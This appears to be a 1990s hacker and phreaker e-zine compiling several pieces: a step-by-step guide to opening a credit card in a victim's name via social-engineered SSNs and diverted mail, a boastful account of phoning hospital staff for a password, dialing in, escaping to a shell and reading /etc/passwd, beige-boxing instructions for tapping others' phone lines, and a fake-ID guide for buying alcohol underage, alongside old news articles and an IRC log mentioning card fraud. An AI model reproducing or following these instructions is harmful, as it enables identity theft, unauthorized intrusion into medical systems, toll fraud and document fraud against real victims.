forget to log off (especially around lunch time :) )This would be handy in 
case you want to look at payroll records in say the "accounting" group. 
Once again, security compromise via stupid end users!

Carding..more basics for the lame...  BY ArcAngl 
 
To check if a CC # is valid phone 1-800-228-1122 (need merchant # usually 5 digits) 
 
 
 
To obtain a valid credit card under someone else's name: 
 
1. Identify a target name, such as one of your teachers, co-workers, ect... 
 
2. Once you have a target name, you need to obtain their SSN.  This can be done in many ways 
using social engineering.  For example:  call up the target's electric company, saying you are 
him, and that you need to make a change to you mailing information possibly.  Ask them what  
information they have on record.  Then say, also, Iíd like to verify my SSN that you have, I had a mix up a  
few years ago, and I want to make sure you have the correct one...what do you have?   
 
3. Once you have the targetís SSN, obtain a Visa/MasterCard application.  You can find these in many  
places: banks, magazine inserts, ect...or simply call and request one.  Once you have the application,  
simply fill out the form with the targetís name.  Now the hard part:  for the address, you will need to have  
a place that you have access to the mail delivery.  DO NOT USE YOUR OWN!  You may try: neighbors  
on extended vacation, house where people just moved out, house just built, a friend that will deny any  
receipt of a card, ect...you get the picture.  Then fill in the targetís SSN and the rest of the info.  Then  
simply mail it!  You may also call in the info and ask for overnight processing.  Do this from a payphone, or op divert 
for the uberelite!   
 
4. The new card will be sent to the address you specified.  It will be a valid card, in the targetís name and  
all charges will reflect on the targetís credit report.  It will take monthís for the target to realize there is a  
card out there in his name.  You have the physical card in your possession...how many times does  
WalMart ask for ID when charging a new Pentium?  NONE!!!!  Oh yeah...watch for cameras that will id  
you!

        I hesitate to even type this up and submit it for distribution. But I 
want to make the point,that hacking takes RESEARCH! The easiest way to gain 
access to somebody's account is to just ask them for their password.Here's a 
perfect example. 
        One day visiting my Mom at work I was in the IS department at my 
local hospital. I noticed a modem labeled "Dial Up" followed by the phone 
number. So just for giggles I called it and saw. 
 
                         <name of the hospital>  
                            Medical Manager 
 
SCO Unix release 2.3.4 
login: 
 
I went to the hospital the next day and found an old WYSE60 terminal with the 
same login screen sitting on one of the desks. But the terminal also had a 
sticker on it from the vendor advertising their support line. "In case of 
trouble call <company name> 1-800-555-XXXX". Making a mental note of the 
vendor's name I glanced down at the phone and made another mental note of an 
inside line phone number. The next day I called the office on the inside line 
and the conversation went something like this. 
 
 
Office girl: 
        "<name of the department> Jackie speaking.How may I help you?" 
Me:  
           "Hi Jackie! This is <fake name> calling from <company name>. How are 
           you?" 
 
Office girl: 
        "Good. What can I do for you?" 
Me: 
        "Well, we've been really busy here lately. We're upgrading the 
           cryptographic algorithm on your primary   domain controller. As well as 
           re-compiling the user accounts database. And I thought I'd call 
           office to office to make sure that everyone could get in OK. Could 
           you log out and log back in for me?" 
 
Office girl: 
        "Sure, no problem. Just a minute. Do I just enter "jjohnson" and 
           my password like always?" 
 
Me: 
        "Wait a second and I'll dial in and check. You said you enter 
           "jjohnson"? And what password?" 
 
Office girl: 
        "medical" 
 
Me:   
        "All lower case?" 
 
Office girl: 
        "yes" 
 
Me: 
        "Well,<dramatic pause> it looks good on my end. Why don't you go 
           ahead and try" 
 
Office girl: 
        "Ok....<long pause>......Ok I'm in!" 
 
Me: 
        "Great! Thanks, if you run into problems give me a call here at 
           the office" 
 
 
        The thing that struck me about her password was it was "medical" 
which was also apart of the title of the software package that they were 
using. It sounded alot like the default password that came installed when the 
vendor installed all the user accounts.So I promptly dialed in, logged in as 
"jjohnson" with a password of "medical". The bummer was that I was within a 
program and couldn't reach a shell prompt. No problem, I entered "!" (like 
hacking PINE) and bingo, a "$" appeared. After that,I did a cat of 
/etc/passwd to get a listing of all the logins. Notice I didn't do "shadow" 
all I would've got is an "access denied" and a possible entry on the admin's 
log. After that i logged off and checked all the other logins to see if they 
were also using the defaut password of "medical". Sure enough,7 were!! It is 
important to try this in case "Jackie" gets paranoid and calls the support 
line and has her password changed. Then you're back to square one. The moral 
of this story is, I managed to compromise the security of a major hospital 
just by being friendly and confusing the office help. No k-rAd 3l33t3 haX 
here, just stupid end users :) !

DTMF Decoding - By ArcAngl 
 
Ok,  I have had the shits of having newbies beg for info on HOW TO DECODE DTMFs!! 
So here it is.... 2 ways of many! 
  
software: 
WWW.Cyberramp.net/~shima/index.html 
           It will only decode 4 digits at a time with the shareware version, but if 
you're clever, you record the wav file then edit it into pieces to decode 
whole #'s.  
 
...or 
If you're clever, you will record the number, then dial your own pager #  
and play it back into the phone, and press the pound sign when done.  The  
pager will show the # in a minute. ;-

        Hola!  Shoelace here, writing a small, lame entry to inform people 
near me, and in other places down South, about how easy it really is to 
get even the simplest phreaking in.  Contrary to popular belief, there are  
phreaks in Tennessee.  In my town, we have only 5 that I know of.  The most 
noted of course, is dr1x/kz.  I think only three of us have modified our 
Tone Dialers to make them into Red Boxes, with the help of Acid_novA.  But,  
the most simplest of all phreaking here, or at least in East Tennessee, is 
Beige Boxing.  You don't even need aligator clips, or really anything else 
in the help files about Beige Boxing that you have probably read.  All you  
need is a screwdriver, and a regular phone.  You see, behind all the houses 
are these grayish colored boxes of varies sizes.  They usually say  
"Telephone Network Interface" on them.  They are attached by screws.  Unscrew 
it, and open it up.  You will see one, maybe two (if they have two lines),  
holes with phone jacks in them.  Take out that jack, and put in your phone. 
You should have dialtone.  Ta da!  That is how easy it is to Beige Box down 
South.  I don't know what other states have their boxes like this, but if you 
do, don't delay!  Go out and Beige Box!

KEEPING UP WITH THE TELCOS--- by ArcAngl 
 
Employee News & Information Lines: 
--------------------------------- 
The phone company has a phone number that their employees can call up and find out what's new with  
the company, how the company's stock is doing, what new advances in phones have been discovered and  
how they're catching people like us. To get a newsline number, call the phone company's main office and  
ask  
them for it. Sometimes they won't know what you're talking about but keep 
pestering them until they give it to you. Below is a small list of newslines. 
 
           Bell Atlantic....................(800)-647-NEWS 
           Ameritech.......................(800)-893-LINE 
                                                                 (312)-917-9797 
 
Main Numbers & Employee Locators: 
-------------------------------- 
An employee locator is a service for Bell employees that helps you find out 
exactly what department any employee of Bell works for. Sometimes automated, 
you enter in the name of the employee on your touch tone phone and the  
computer will rattle off their work phone number, street address and state. 
Most locators have a live operator who you just ask for the information. 
 
Usually the employee locator is the same number as the main number. To get  
this number, call up directory asisstance and ask them for the phone company's 
main number. Call the main number and if they're not the employee locator, ask 
them for that number. In most cases, it's given to you, no questions asked. 
 
If you can't get the phone company's main number from directory asisstance,  
try calling the billing office and ask them. Below is a short list of numbers. 
 
           Bell Atlantic (West Virginia)..........(304)-954-6202 
           Bell Atlantic (Virginia)...............(804)-225-6300 
           Cincinnati Bell (Ohio).................(513)-397-5775 
           South Central Bell (Jackson, Miss.)....(601)-961-1327 
           Southwestern Bell (Little Rock, Ark.)..(501)-373-9800 
           U.S. West (Western U.S.)...............(800)-879-4357 
           Ameritech (Indianapolis, IN)...........(317)-265-2266 
           Southern Bell (South Carolina).........(800)-336-0014 
           Pacific Bell (Los Angeles, CA).........(213)-339-6622

Fake IDs by N-TREEG 
 
This article is for all of you out there that's ever wanted to make yourself 
a fake ID. THTJ brings you a quick and easy method.  Note, these type of ID's 
won't get you into a club, nor will they get you alcohol from a major liquor 
store that scrutinizes ID's closely.  These will get you alcohol at a grocery 
store if a teenage cashier asks you for some id while you're buying that 
bottle of wine cooler (or rum I luv rum!).  Shall we begin?  All righty... 
 
MATERIALS 
Okay you're gonna need a few things.  Here's what you'll need: 
 
 1)  A computer and a printer, preferably inkjet or laser. 
  
 2)  Transparencies that are suited to work with your type of printer.  Some 
        regular white (or colored/patterned) printer paper would be nice too. 
 
 3)  An index card. 
 
 4)  A small laminating machine.  You can pick these up from Office Depot for 
        about $49.  Split the cost with some friends.  Or if you're gonna be 
        selling ID's it'll eventually pay for itself. 
 
 5)  Laminating pouches to use in the laminating machine.  These don't usually 
        come with the laminating machine.  Don't forget to pick some up.  Also 
        found at Office Depot. 
 
 6)  Colorful paper currency from a foreign country.  Go to your local bank and 
        ask to purchase some paper bills from maybe a Caribbean island or 
        something.  They usually have nicely colored paper money.  Something with 
        green, yellow, orange, tan, or red works well.  Make sure the money has 
        some sort of government seal on it. 
 
 7)  A good picture of  yourself.  When you take the picture, make sure you are 
        in front of a solid colored background.  It wouldn't fool anyone if you use 
        a picture of yourself taken in front of a brick wall.  Try to take the 
        picture in front of a solid colored wall or curtain. 
 
 MAKING THE ID 
 
Okay now that you've gathered your necessities, it's time to go to work. First 
you want to make your info sheet with your computer.  In a word processor, 
make a box about the size of a drivers license with the info you want to 
appear on your id.  Include a name, address, identification number, birthdate, 
etc. etc.  Make sure you leave space to the left for a picture to go.  Now 
print up the sheet on a transparency and cut it out. 
 
Lay your transparency over the paper money.  Get the idea now?  The paper 
money makes a great background.  Slip your picture in between the transparency 
and the paper money background in the spot you left empty for the photo. 
Doesn't that look great?  Well almost.  The side with the picture on it is 
thicker isn't it?  That's what you use the index card for.  Cut an index card 
in the shape of the id minus the amount of space the photo takes up.  Now 
place the index card behind the paper money and the whole thing should be 
about equal depth. 
 
Now go back to your computer and print out some stuff for the back of your id. 
Make a little box with the caption "thumb print" if you like, then you can 
stick your thumb in an ink pad and put your thumb print in the box to make the 
id look more authentic.  Also put up some stuff about blood type.  Make a 
rectangular box at the bottom for a signature.  At the top put up a heading 
with something similar to "PROPERTY OF THE ISLAND OF BARBADOS  U.S.  Embassy" 
or some b.s. like that.  Do whatever comes to mind with it.  Print it out on 
your regular white computer paper (or you can go for that patterned paper they 
sell at office depot).  Cut it to size and attach it to the back of the id 
with the index card sandwiched between the white paper and the paper money. 
Once you're satisfied with the way your id is laid out, follow your 
laminiator's instructions to seal your id in plastic.  Make sure the edges 
are smooth and rounded and try not to let any air-bubbles gather in your 
laminated id. 
 
You've now got yourself a pretty cheesy id.  But hey, sometimes they work. 
A good friend of mine uses his all the time at a gas station to buy beer. 
They are also helpful if you go on cruises to places like say.....Cancun! 
where they _really_  don't care how old you are, but you still gotta have 
some kind of ID. 
 
Here's a few suggestions and add-ons for your id.  When making your 
transparency, make a copy of the government seal off of the paper currency. 
Incorporate that into your transparency to make it look more authentic.  I 
personally don't know where to get holograms made or how to incorporate them. 
For something similar, try to get some of that "rainbow" like paper they use 
in gift baskets...the kind that change colors and shimmers when you reflect 
light off of it.  Put some of that behind the seal to make an illusion of a 
hologram.  You can also try reflective tape (by 3M), I don't know how well 
that will work.  It's up to you to experiment.  Have fun, and play nicely! 
 
 
Special thanks to SirRob for introducing me to the concept.

it doesn't work.  i cannot access your server.  netscape just sits there 
and times out, and if i set ping to send 20 packets, only about 2 or 3 
come back, the rest time out.  what's up with this?  aren't you paying a 
bit of money for this?  i think it's time to give nethosting.com a nasty 
letter....

Subject: Hackbook 
 
Most of the material thats in people's faces is anti-hack.  They spend countless hours, 
pages, bandwidth, what have you, blabbing on and on about how evil the hacking society 
is.  How addicted and destructive we all are. 
 
I'd like to change that.  I want you to send me something about yourself and why 
you hack/phreak, your opinions on it.  Be it an essay, a story, anything! i'm not 
picky.  Though it must be done well.  Spend some time on it.  You're representing 
hackers/phreakers world round.  You don't have to include your real name or any RL 
information about yourself.  Just your handle, something to identify yourself by and I 
won't include your e-mail address if you don't want me to.  It can be as abstract or as 
realistic as you like it but it has to be about YOU and some of the little episodes 
that people usually don't get a chance to experience and see. There's no page 
limit...the longer the better.  Be as detailed as possible.  NO LAMERS ACCEPTED! 
 
After this is done my main goal is to get this thing published. So, if you have any 
contacts, ideas, submissions, whatever, e-mail me: 
 
spookyy@erols.com 
 
The beginning deadline is October 31, 97.

 Snafu sets off chaos on Net Human error: 
 E-mail blocked and Web sites vanish. 
 By David L. Wilson and Elizabeth Wasserman, Mercury News Staff Writers  
  
 A human error sent the global Internet into chaos Thursday, bouncing  
 millions of e-mail messages back to senders and repeatedly informing users  
 that their favorite Web sites simply did not exist. 
 
The cyberspace meltdown began in the early morning hours after a technician  
at Network Solutions Inc. in Virginia, which controls the Net's most  
important electronic directory of addresses, programmed the network's  
computers with incorrect data.  
 
Thursday's huge outage renewed concerns about the fragile underpinnings of  
the Internet, the global network of networks that is playing an increasingly  
critical role in commerce and communications.  
 
Employees of Network Solutions quickly sent out corrected address information  
to the Internet's computers, but the fix took hours to trickle down through  
all the systems used to route data in cyberspace. Intermittent outages  
continued throughout the day. 
 
While the garbling of the address database is not unprecedented, experts said  
the disruption was unusual because of its scope and persistence. "I don't  
think I've seen it this bad before," said Todd Stanford, an Internet  
consultant in San Jose who spent much of the day wrestling with problems  
caused by the outage. 
 
Network Solutions, which is responsible for administering the most popular  
"domain names," including those ending with .com, is also responsible for  
programming key computers on the Net used to route data. The addressing  
information is stored in the Domain Name Server system. 
 
When any kind of information -- whether electronic mail or a Web site address  
-- is sent out on the Net, the sender's local computers check with other  
computers, called servers, that are part of the Domain Name Server system, to  
ensure proper delivery. For example, if a person sends an e-mail missive to  
joe@internetprovider.com, the sender's system looks to the Domain Name Server  
system to see how the e-mail should be routed. 
 
Server hierarchy 
 
 If the necessary address information can't be found on a local computer,  
 that local server checks with another address server higher up the chain.  
 The most important parts of the system are the top-level domain zone  
 servers. There are nine of them, eight in the United States and one in  
 Europe. 
 
In cases where the Internet routing computers get confused or don't know what  
to do next, they look to these top-level servers for instructions, and the  
top-level servers have final authority. 
 
It was while implementing one of the regular updates to the database on the  
top-level servers Wednesday night that an unidentified Network Solutions  
technician erred, the company said. A glitch in Network Solutions computers  
created bad information in files that the technician was preparing to  
transmit to the servers. The company has monitoring software that can spot  
such glitches, but the technician implemented the update despite the alert  
from the software, violating company policy. 
 
The result was that the database on the Net for two types of domains, those  
that end in .com and .net, was corrupted. 
 
Hopeless muddle 
 
 The erroneous updates went out about 2:30 a.m. EDT Thursday, and slowly  
 spread through the address system. By the time a corrected version of the  
 file was distributed by Network Solutions about four hours later, much of  
 the Internet's addressing mechanism was hopelessly muddled. 
 
"The Internet's never been as reliable as something like the phone system,"  
said David Filo, co-founder of Yahoo, the Silicon Valley company that helps  
people search the Web. "Over the last few years, it's actually gotten better.  
At the same time, it's been growing so rapidly that in some sense, it's also  
gotten more fragile." 
 
"The people who are assuming that they are building on a stable  
infrastructure are in for some big surprises," said Eugene H. Spafford, head  
of a computer security lab at Purdue University. 
 
To Spafford, there was also a lighter side to the outage. "It was actually  
very pleasant. I went a whole day without getting any spam. I got a lot done  
and I'm thinking we may need to do this more often." 
 
Despite the explanation of human error, many observers suspected something  
more nefarious at work, perhaps a prank launched last week that may have  
gotten out of hand. 
 
Hijacking InterNIC 
 
 Network Solutions operates an entity called InterNIC, under contract to the  
 National Science Foundation, that handles registration of some of the most  
 important domain names. On July 11, a group calling itself "AlterNIC," which  
 objects to what it calls InterNIC's monopoly on registration of some domain  
 names, hijacked the main Web address used to access InterNIC.  
 
InterNIC controls registration to the domain names .com, .net, .edu, .org,  
.gov and .mil. 
 
Rival companies such as AlterNIC have created their own categories of domain  
names, such as .biz, but those have not been as widely accepted on the Net,  
and not every Net user can reach sites that they register. 
 
Over the weekend, AlterNIC used a security flaw in many Internet computers to  
redirect Net users who tried to access "www.internic.net" to the AlterNIC  
site, in what the company described as a "protest." (Users could still get to  
the InterNIC from the AlterNIC site, or use InterNIC's alternate address,  
http://rs.internic.com/). 
 
"By redirecting the domain name `www.internic.net,' we are protesting the  
recent InterNIC claim to ownership of `.com,' `.org,' and `.net,' which they  
were supposed to be running in the public trust," said a letter from  
AlterNIC's Eugene Kashpureff, the chief financial officer, posted on the  
AlterNIC Web site. "Our apologies for any trouble this DNS domain name system  
protest has caused you." 
 
Kashpureff, in an interview, said the company ended the protest Monday  
morning, but as late as Thursday, some Net users were still being routed to  
the AlterNIC site when they tried to access InterNIC. 
 
Both Kashpureff and Network Solutions deny that his actions led to Thursday's  
problems. 
 
Others suspected a deliberate attack on the network's infrastructure,  
something that federal authorities have been sweating about for years. An FBI  
agent who agreed to comment on condition of anonymity said, "This is clearly  
one way of damaging the economic interests of this country, and we are  
looking at this incident, any such incident, for evidence that this is a  
deliberate act of sabotage. But we have no evidence at all to suggest that at  
the present time." 
 
Bill Orvis, a member of the Energy Department's Computer Incident Advisory  
Capability at Lawrence Livermore Lab, agreed. "It's not impossible that  
there is some kind of attack going on, but I think the odds of this one thing  
being an attack are low."

 German Telco Pioneers Internet Telephony  
 (07/18/97; 6:30 p.m. EDT) 
 By Douglas Hayward, TechWire 
 
 FRANKFURT, Germany -- Internet voice telephony took a giant leap forward  
 Friday when Deutsche Telekom became the first of the world's major telephone  
 companies to launch an international trial of the fledgling technology. 
 
Deutsche Telekom, Europe's largest telecommunications carrier and Internet  
service provider, said it has begun piloting an Internet-based voice  
telephony service between the United States, Germany, Japan and Canada. The  
pilot, which involves customers using ordinary handsets rather than  
computers, will involve 1,000 users, mostly employees of multinational  
companies. 
 
"The targets of this project are to test the technology, to analyze the  
usage, and to evaluate whether Internet telephony can be offered at lower  
rates than conventional telephone service," Deutsche Telekom said in a  
statement Friday. 
 
The service will be restricted to selected regions, mostly large cities,  
within the four countries. Customers will use ordinary telephones to call a  
number in each country that routes their calls to an Internet "gateway." From  
the gateway, voice signals are compressed into digitized information  
"packets," which are transported across the Internet, using the TCP/IP  
protocol, to the gateway nearest the number they are calling. At this second  
gateway, the call is decompressed, and it re-enters the ordinary public  
telephone network as an seemingly ordinary telephone call. 
 
Deutsche Telekom will not charge pilot customers for the cost of carrying the  
call over the Internet nor for the cost of terminating the call over the  
public network. Instead, callers will only have to pay the cost of accessing  
the gateways, set at about 24 pfennings (13 cents) a minute ñ just under a  
fifth of the cost of a normal voice call from Germany to the United States. 
 
Analysts welcomed the announcement by Deutsche Telekom. "This is an  
interesting and creative move," said Andrew Clarke, an analyst at  
London-based telecommunications researcher Philips Tarifica. "It will be  
interesting to see how Deutsche Telekom charges for the full service. I would  
estimate very roughly that the full charge could be around 60 pfennings (33  
cents) a minute, which is cheap but not so cheap that it's almost free," he  
said. 
 
Although the Finnish national telco announced an Internet telephony service  
several months ago, Deutsche Telekom is the first major telco to embrace the  
technology. Tarifica estimated in May this year that independent Internet  
voice telephony carriers would cost Deutsche Telekom, British Telecom and  
France Telecom a combined total of some $372 million per year by 2001. 
 
"The major telcos are all testing this technology, but it's an interesting  
and positive sign that it was Deutsche Telekom that was the first to come out  
into the open," said Cathy Burrows, a British-based analyst at researcher  
International Data Corp. "At the end of the day, pricing is going to be key.  
Every telco has to think very carefully about what their approach is going to  
be." 
 
Even at the rate of 60 pfennings, Deutsche Telekom will likely be undercut by  
independent carriers such as Hackensack, N.J.-based IDT, which is about to  
introduce handset-based Internet telephony for 10 cents a minute between  
Germany and the United States. "We can beat Deutsche on price and scope, and  
we think we can beat them on quality too," said Sarah Hofstepter, a  
spokeswoman for IDT.  
 
"It looks like Deutsche Telekom's pilot is being pitched as an alternative to  
[charge] cards and to call-back services rather than as a competitor to  
traditional telephony," Tarifica's Clarke said. "That shows Deutsche Telekom  
is using Internet telephony creatively." 
 
Many analysts said that the major carriers have no choice in the matter they  
have to embrace the Internet in order to control and contain it. 
 
"Deutsche Telekom has realized that it makes sense for you to get into  
Internet telephony early, so that if users are tempted to defect to voice  
telephony, they at least are tempted onto your service rather than onto  
someone else's," said Clarke. "If your throat is going to be cut anyway, why  
not do it yourself?"

 3 Yemenis sue NASA for trespassing on Mars   
 They say they inherited it 3,000 years ago   
 July 24, 1997 
  
 WASHINGTON (CNN) -- No one expects to lose much sleep over it but, for the  
 record, NASA has been sued by three men from Yemen for invading Mars.   
 
The three say they own the red planet, and claim they have documents to prove  
it.   
 
"We inherited the planet from our ancestors 3,000 years ago," they told the  
weekly Arabic-language newspaper Al-Thawri, which published the report  
Thursday.   
 
Adam Ismail, Mustafa Khalil and Abdullah al-Umari filed the lawsuit in San'a,  
Yemen, and presented documents to the country's prosecutor general which they  
say proves their claim. There was no word on whether they had paid the  
appropriate inheritance taxes.   
 
The claim is prompted, apparently, by the exploration of Mars by NASA's  
Pathfinder spacecraft and Sojourner rover, which have been sending back  
photos and data for analysis since early July.   
 
"Sojourner and Pathfinder, which are owned by the United States government,  
landed on Mars and began exploring it without informing us or seeking our  
approval," the men charge.   
 
They demand the immediate suspension of all operations on Mars until a court  
delivers a verdict. They also ask that NASA refrain from disclosing any  
information pertaining to Mars' atmosphere, surface or gravity before  
receiving approval from them, or until a verdict is reached.   
 
'It's a ridiculous claim'    
 
"It's a ridiculous claim," NASA news chief Brian Welch told CNN Thursday  
after smothering a chuckle. "Mars is a planet out in the solar system that is  
the property of all humanity, not two or three guys in Yemen."   
 
Richard Cook, the Pathfinder mission manager at NASA's Jet Propulsion  
Laboratory in Pasadena, California, agreed. "It's everybody's," he said.  
"Mars is for the whole world to explore and to understand."   
 
Welch says a 1967 international treaty holds that everything in the solar  
system, except Earth itself, is the property of everyone in the world and no  
one country.   
 
"Just because we land on Mars first doesn't mean the United States owns it,"  
he said.   
 
Welch said he thought the issue could get more serious in the future "when  
people actually are going to these places and the resources found have some  
value. ... More complicated issues will have to be resolved between  
countries, or between companies."   
 
Taking the opportunity to clear the air on another galactic real estate  
matter, Welch said he knew of no plans to take legal action against a man who  
has been selling deeds to property on the moon.   
 
Welch said the deeds are as worthless as the Yemenis' claims. "That's why  
they invented the phrase 'Caveat emptor' [Let the buyer beware]," he said.

 AOL Posts Sentry against Viruses 
 by David Lazarus  
 
 12:08pm 30.Jul.97.PDT -- Those darn Trojan horses are still knocking at  
 America Online's door, so the service introduced a new feature Wednesday  
 intended to prevent members from letting a virus slip through the gates. The  
 "Download Sentry" is an automatic warning that pops up each time an AOL  
 subscriber attempts to download email attachments to his or her hard drive.  
 
"We have seen over the last several months an increasing number of Trojan  
horses, and more members downloading them," said AOL spokeswoman Tricia  
Primrose. "This is a real effort to educate members that there are files out  
there that can contain viruses."  
 
What these Trojan horses do is enter one's hard drive when an email  
attachment is activated, and then lurk in the shadows until the next time you  
log on to AOL. The virus then leaps forward, snatches your password and sends  
it back to a waiting hacker, who could, if so inclined, perpetrate all manner  
of mischief. Most Trojan horses cannot be spotted in advance by anti-virus  
programs.  
 
Tatiana Gau, AOL's vice president of integrity assurance, said "an increasing  
number" of members have actually activated Trojans. Often, the virus is  
masked behind enticing commands like GAMES.EXE, PORN.EXE, and PLAYBOY.ZIP.  
They also hide within add-ons for popular software titles, or in free  
screensavers.  
 
The new Download Sentry aims to remind AOL members of the danger. When an  
email message with an attached file is downloaded, a window pops up and says:  
"Warning! You are about to download a file which contains executable code.  
Downloading files from unknown sources might cause harm to your computing  
environment or display objectionable material. Do you wish to proceed?"  
 
If the answer is yes, members do so at their own risk. Those who don't need  
to be told twice have the option of switching off the alert.  
 
"The Download Sentry will help our members help themselves - by reminding  
them not to download email files sent to them from unknown sources," Gau  
said.

[9:49] *** shoelace (funkdat@bull-max43.dynamic.usit.net) has joined #DowNINit 
[9:50] <shoelace> hi 
k0w.com 
[9:50] <shoelace> guess what happened this morning? 
<Keystroke> what? 
<Keystroke> u harass OCI? 
[9:50] <shoelace> i'll tell u in here 
[9:50] <shoelace> um 
[9:50] *** W sets mode: +o Keystroke 
[9:51] <shoelace> i was just awoken five minutes ago 
[9:51] *** Keystroke sets mode: +o shoelace 
<Keystroke> cool 
[9:51] <shoelace> and my mom told me that the secret service had just called  
   neeeding to talk to my dad 
[9:51] <shoelace> and she said, she being the secret service person 
[9:51] <shoelace> that our number keeps coming up on their screens 
[9:51] <shoelace> part two 
[9:51] <shoelace> first 
<Keystroke> :/ 
[9:52] <shoelace> why would my main line, the one being for my parents 
[9:52] <shoelace> come up on their screens, when the only thing i ever do is with my  
   computer line 
[9:52] <shoelace> fuck 
[9:52] <shoelace> fuc 
[9:52] <shoelace> fuck 
[9:52] <shoelace> part three 
[9:52] <shoelace> the first thing i thought of was my credit card fraud 
<Keystroke> what # did the secret service call from? ill prank em! 
[9:53] <shoelace> but how could that be it, if the only thing i have done is on MY  
   fone line? 
[9:53] <shoelace> hmmm..

<Keystroke> and like the cc#'s 
[9:53] <shoelace> no 
[9:53] <shoelace> it calls friends also 
[9:53] <shoelace> fuck 
<Keystroke> they still know its not the main line 
[9:54] <shoelace> it *might* be about the voice mail that dr1x set up for me 
<Keystroke> what are their screens? 
[9:54] <shoelace> because Phrax had one, dr1x had one, i had one, and REailty had one 
<Keystroke> maybe 
<Keystroke> :/
